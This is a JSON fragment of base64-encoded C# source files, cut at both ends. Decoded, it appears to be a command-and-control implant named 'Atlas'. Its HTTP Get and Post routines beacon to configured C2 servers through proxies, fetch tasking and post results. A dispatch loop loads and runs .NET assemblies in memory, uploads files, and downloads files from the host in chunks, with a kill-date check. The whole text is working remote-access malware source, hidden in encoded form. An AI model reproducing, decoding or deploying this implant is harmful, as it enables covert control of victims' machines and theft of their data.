CAgICAgICBzdHJpbmcgZmluYWxfcmVzdWx0ID0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKHJlc3VsdCkpOw0KI2VsaWYgKERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICAgICAgICAgIHN0cmluZyBmaW5hbF9yZXN1bHQgPSBDcnlwdG8uRGVjcnlwdChyZXN1bHQpOw0KI2VuZGlmDQogICAgICAgICAgICAgICAgVXRpbHMuUG9zdFJlc3BvbnNlUmVzcG9uc2UgUG9zdFJlc3BvbnNlUmVzcG9uc2UgPSBVdGlscy5Qb3N0UmVzcG9uc2VSZXNwb25zZS5Gcm9tSnNvbihmaW5hbF9yZXN1bHQuU3Vic3RyaW5nKDM2KSk7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuUmVzcG9uc2UgUmVzcG9uc2UgaW4gUG9zdFJlc3BvbnNlUmVzcG9uc2UucmVzcG9uc2VzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoVXRpbHMuSm9iIEpvYiBpbiBKb2JMaXN0LmpvYnMpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tcGxldGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IudGFza19pZCA9PSBSZXNwb25zZS50YXNrX2lkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFJlc3BvbnNlLnN0YXR1cyA9PSAic3VjY2VzcyIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuZG93bmxvYWQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5maWxlX2lkID09IG51bGwpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuZmlsZV9pZCA9IFJlc3BvbnNlLmZpbGVfaWQ7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IudG90YWxfY2h1bmtzID09IEpvYi5jaHVua19udW0pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBVdGlscy5SZW1vdmVKb2IoSm9iLCBKb2JMaXN0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEpvYi5jaHVua3MuQ291bnQgIT0gMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY2h1bmtzLlJlbW92ZUF0KDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAoKEpvYi50b3RhbF9jaHVua3MgIT0gMCkgJiYgKCFKb2IudXBsb2FkKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSArIDEgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuUmVtb3ZlQXQoMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua19udW0rKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVXRpbHMuUmVtb3ZlSm9iKEpvYiwgSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFV0aWxzLlJlbW92ZUpvYihKb2IsIEpvYkxpc3QpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2gNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KI2lmIChERUZBVUxUIHx8IERFRkFVTFRfUFNLIHx8IERFRkFVTFRfRUtFKQ0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBHZXQoc3RyaW5nIEI2NERhdGEpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyByZXN1bHQgPSBudWxsOw0KICAgICAgICAgICAgV2ViQ2xpZW50IGNsaWVudCA9IG5ldyBTeXN0ZW0uTmV0LldlYkNsaWVudCgpOw0KICAgICAgICAgICAgaWYgKENvbmZpZy5EZWZhdWx0UHJveHkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gV2ViUmVxdWVzdC5EZWZhdWx0V2ViUHJveHk7DQogICAgICAgICAgICAgICAgY2xpZW50LlVzZURlZmF1bHRDcmVkZW50aWFscyA9IHRydWU7DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5LkNyZWRlbnRpYWxzID0gQ3JlZGVudGlhbENhY2hlLkRlZmF1bHROZXR3b3JrQ3JlZGVudGlhbHM7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIC8qaWYgKENvbmZpZy5Ib3N0SGVhZGVyICE9ICIiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiSG9zdCIsIENvbmZpZy5Ib3N0SGVhZGVyKTsNCiAgICAgICAgICAgIH0qLw0KICAgICAgICAgICAgY2xpZW50LlF1ZXJ5U3RyaW5nLkFkZChDb25maWcuUGFyYW0sIEI2NERhdGEuUmVwbGFjZSgiKyIsICIlMkIiKS5SZXBsYWNlKCIvIiwgIiUyRiIpLlJlcGxhY2UoIj0iLCAiJTNEIikuUmVwbGFjZSgiXG4iLCAiJTBBIikpOw0KICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnMgPSBDb25maWcuU2VydmVycy5PcmRlckJ5KHM9PnMuY291bnQpLlRvTGlzdCgpOw0KICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmVzdWx0ID0gY2xpZW50LkRvd25sb2FkU3RyaW5nKENvbmZpZy5TZXJ2ZXJzWzBdLmRvbWFpbiArIENvbmZpZy5VcmwpOw0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzWzBdLmNvdW50Kys7IA0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBQb3N0KHN0cmluZyBCNjREYXRhKQ0KICAgICAgICB7DQogICAgICAgICAgICBzdHJpbmcgcmVzdWx0ID0gbnVsbDsNCiAgICAgICAgICAgIFdlYkNsaWVudCBjbGllbnQgPSBuZXcgU3lzdGVtLk5ldC5XZWJDbGllbnQoKTsNCiAgICAgICAgICAgIGlmIChDb25maWcuRGVmYXVsdFByb3h5KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5Qcm94eSA9IFdlYlJlcXVlc3QuRGVmYXVsdFdlYlByb3h5Ow0KICAgICAgICAgICAgICAgIGNsaWVudC5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSB0cnVlOw0KICAgICAgICAgICAgICAgIGNsaWVudC5Qcm94eS5DcmVkZW50aWFscyA9IENyZWRlbnRpYWxDYWNoZS5EZWZhdWx0TmV0d29ya0NyZWRlbnRpYWxzOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFdlYlByb3h5IHByb3h5ID0gbmV3IFdlYlByb3h5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBBZGRyZXNzID0gbmV3IFVyaShDb25maWcuUHJveHlBZGRyZXNzKSwNCiAgICAgICAgICAgICAgICAgICAgVXNlRGVmYXVsdENyZWRlbnRpYWxzID0gZmFsc2UsDQogICAgICAgICAgICAgICAgICAgIENyZWRlbnRpYWxzID0gbmV3IE5ldHdvcmtDcmVkZW50aWFsKENvbmZpZy5Qcm94eVVzZXIsIENvbmZpZy5Qcm94eVBhc3N3b3JkKQ0KICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgY2xpZW50LlByb3h5ID0gcHJveHk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjbGllbnQuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCBDb25maWcuVXNlckFnZW50KTsNCiAgICAgICAgICAgIC8qaWYgKENvbmZpZy5Ib3N0SGVhZGVyICE9ICIiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGNsaWVudC5IZWFkZXJzLkFkZCgiSG9zdCIsIENvbmZpZy5Ib3N0SGVhZGVyKTsNCiAgICAgICAgICAgIH0qLw0KICAgICAgICAgICAgQ29uZmlnLlNlcnZlcnMgPSBDb25maWcuU2VydmVycy5PcmRlckJ5KHMgPT4gcy5jb3VudCkuVG9MaXN0KCk7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXN1bHQgPSBjbGllbnQuVXBsb2FkU3RyaW5nKENvbmZpZy5TZXJ2ZXJzWzBdLmRvbWFpbiArIENvbmZpZy5VcmwsIEI2NERhdGEpOw0KICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZy5TZXJ2ZXJzWzBdLmNvdW50Kys7DQogICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KI2VuZGlmDQogICAgfQ0KfQ0K"},{"Uuid.txt":"VVVJRF9IRVJF"},{"Utils.cs":"77u\/dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uVGhyZWFkaW5nOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9uczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLkxpbnE7DQoNCm5hbWVzcGFjZSBBdGxhcw0Kew0KICAgIHB1YmxpYyBjbGFzcyBVdGlscw0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExvb3AoSm9iTGlzdCBKb2JMaXN0KQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoIUNoZWNrRGF0ZSgpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBIdHRwLkdldFRhc2tpbmcoSm9iTGlzdCk7DQogICAgICAgICAgICBEaXNwYXRjaChKb2JMaXN0KTsNCiAgICAgICAgICAgIEh0dHAuUG9zdFJlc3BvbnNlKEpvYkxpc3QpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIERpc3BhdGNoIChKb2JMaXN0IEpvYkxpc3QpDQogICAgICAgIHsNCiAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEpvYiBKb2IgaW4gSm9iTGlzdC5qb2JzKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFKb2Iuam9iX3N0YXJ0ZWQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY29tbWFuZCA9PSAibG9hZGFzc2VtYmx5IikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmNodW5rX251bSA9PSBKb2IudG90YWxfY2h1bmtzKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJlYWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5jb21tYW5kID09ICJ1cGxvYWQiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChKb2IuY2h1bmtzLkNvdW50ID09IDApDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyZWFkIHRocmVhZCA9IG5ldyBUaHJlYWQoKCkgPT4gRXhlY3V0ZVRhc2tpbmcoSm9iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZC5TdGFydCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudGhyZWFkID0gdGhyZWFkOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKEpvYi5kb3dubG9hZCkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLmZpbGVfaWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghU3lzdGVtLklPLkZpbGUuRXhpc3RzKEpvYi5wYXJhbWV0ZXJzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gIkVycm9yIGZpbGUgZG9lcyBub3QgZXhpc3RzIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50b3RhbF9jaHVua3MgPSAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnBhdGggPSBNb2R1bGVzLkRvd25sb2FkLkdldFBhdGgoSm9iLnBhcmFtZXRlcnMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnRvdGFsX2NodW5rcyA9IChpbnQpTW9kdWxlcy5Eb3dubG9hZC5HZXRUb3RhbENodW5rcyhKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuZmlsZV9zaXplID0gTW9kdWxlcy5Eb3dubG9hZC5HZXRGaWxlU2l6ZShKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIGlmIChKb2IuY2h1bmtzLkNvdW50ID4gMSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlVGFza2luZyhKb2IpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJlYWQgdGhyZWFkID0gbmV3IFRocmVhZCgoKSA9PiBFeGVjdXRlVGFza2luZyhKb2IpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWQuU3RhcnQoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuam9iX3N0YXJ0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi50aHJlYWQgPSB0aHJlYWQ7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBFeGVjdXRlVGFza2luZyhKb2IgSm9iKQ0KICAgICAgICB7DQogICAgICAgICAgICB0cnkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzd2l0Y2ggKEpvYi5jb21tYW5kLlRvTG93ZXIoKSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGNhc2UgImxvYWRhc3NlbWJseSI6DQogICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gYXNzZW1ibHkgPSBNb2R1bGVzLkdldEFzc2VtYmx5KEpvYi5jaHVua3MsIEpvYi50b3RhbF9jaHVua3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKE1vZHVsZXMuTG9hZChKb2IuZmlsZV9pZCwgQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhhc3NlbWJseSkpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jb21wbGV0ZWQgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBzdWNjZXNzZnVsbHkgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnJlc3BvbnNlID0gImFzc2VtYmx5IGNvdWxkIG5vdCBiZSBsb2FkZWQiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5zdWNjZXNzID0gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgY2FzZSAicnVuYXNzZW1ibHkiOg0KICAgICAgICAgICAgICAgICAgICAgICAgUnVuQXNzZW1ibHkgcnVuQXNzZW1ibHkgPSBSdW5Bc3NlbWJseS5Gcm9tSnNvbihKb2IucGFyYW1ldGVycyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIU1vZHVsZXMuQ2hlY2socnVuQXNzZW1ibHkuYXNzZW1ibHlfaWQpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5yZXNwb25zZSA9ICJhc3NlbWJseSBub3QgbG9hZGVkIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IuY29tcGxldGVkID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IGZhbHNlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IG5ldyBzdHJpbmdbXSB7IH07DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocnVuQXNzZW1ibHkuYXJncy5MZW5ndGggPj0gMikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmdzID0gcnVuQXNzZW1ibHkuYXJncy5TcGxpdCgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFyZ3MgPSBuZXcgc3RyaW5nW10geyBydW5Bc3NlbWJseS5hcmdzIH07DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgcmVzcG9uc2UgPSBNb2R1bGVzLkludm9rZShydW5Bc3NlbWJseS5hc3NlbWJseV9pZCwgYXJncyk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2UuTGVuZ3RoIDwgQ29uZmlnLkNodW5rU2l6ZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IucmVzcG9uc2UgPSByZXNwb25zZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2IudG90YWxfY2h1bmtzID0gKHJlc3BvbnNlLkxlbmd0aCArIENvbmZpZy5DaHVua1NpemUgLSAxKSAvIENvbmZpZy5DaHVua1NpemU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IGNvdW50ID0gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aGlsZSAoY291bnQgIT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgPT0gSm9iLnRvdGFsX2NodW5rcykNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50IHNpemUgPSByZXNwb25zZS5MZW5ndGggLSAoY291bnQgKiBDb25maWcuQ2h1bmtTaXplKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEpvYi5jaHVua3MuQWRkKHJlc3BvbnNlLlN1YnN0cmluZygoc2l6ZSksIGNvdW50KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNodW5rcy5BZGQocmVzcG9uc2UuU3Vic3RyaW5nKChjb3VudCAqIENvbmZpZy5DaHVua1NpemUpLCBDb25maWcuQ2h1bmtTaXplKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb3VudCsrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgSm9iLmNvbXBsZXRlZCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSm9iLnJlc3BvbnNlICE9ICJcclxuIikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBKb2Iuc3VjY2VzcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgSm9iLnN1Y2Nlc3MgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICBjYXNlICJsaXN0bG9hZGVkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghQ29uZmlnLk1vZHVs